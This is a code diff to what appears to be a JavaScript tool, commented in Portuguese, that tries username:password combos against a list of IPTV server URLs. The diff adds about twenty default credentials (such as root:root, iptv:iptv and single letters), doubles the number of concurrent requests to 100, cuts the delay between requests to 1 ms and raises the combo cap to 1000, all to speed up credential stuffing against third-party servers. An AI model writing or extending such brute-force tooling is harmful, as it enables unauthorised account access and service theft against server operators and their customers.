@@ -638,7 +638,7 @@
     "http://tv.com.vc",
     "http://tv.dimaiptv.com:8080",
     "http://tv1.my:80",
-    "http://tv5.me",
+    "http://tv5.me:80",
     "http://tv5.me:80",
     "http://tvlg.appxc.top",
     "http://ust.lat",
@@ -760,7 +760,27 @@
     "0000:0000",
     "guest:guest",
     "free:free",
-    "trial:trial"
+    "trial:trial",
+    "teste:teste",
+    "usuario:senha",
+    "root:root",
+    "client:client",
+    "m3u:m3u",
+    "iptv:iptv",
+    "stream:stream",
+    "tv:tv",
+    "123:123",
+    "1:1",
+    "a:a",
+    "b:b",
+    "c:c",
+    "d:d",
+    "e:e",
+    "f:f",
+    "g:g",
+    "h:h",
+    "i:i",
+    "j:j"
   ];
   
   // ===== CONSTANTES & ESTADOS =====
@@ -783,7 +803,7 @@
   let totalHits = 0;
   let totalTested = 0;
   let activeRequests = 0;
-  const MAX_CONCURRENT_REQUESTS = 50; // Aumentado para mais velocidade
+  const MAX_CONCURRENT_REQUESTS = 100; // Aumentado para máxima velocidade
   
   // Função para mostrar notificação visual e sonora
   function showNotification(msg, duration = 5000) {
@@ -820,7 +840,7 @@
       let lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
       combos = lines.filter(l => l.includes(':')); // mínimo username:password
       
-      // Adicionar combos conhecidos para garantir que testamos alguns
+      // Adicionar combos conhecidos para garantir que testemos alguns
       combos = [...knownCombos, ...combos.slice(0, 100)];
       
       showNotification(`${combos.length} combos carregados online.`);
@@ -1052,7 +1072,7 @@
       }
       
       // Delay mínimo entre requisições
-      await delay(5);
+      await delay(1);
     }
   }
   
@@ -1080,7 +1100,7 @@
     copyAllBtn.disabled = true;
     
     // Limitar o número de combos para processar
-    const maxCombos = Math.min(500, combos.length); // Aumentado para 500
+    const maxCombos = Math.min(1000, combos.length); // Aumentado para 1000
     const combosToProcess = combos.slice(0, maxCombos);
     
     // Processar combos em paralelo com controle de concorrência
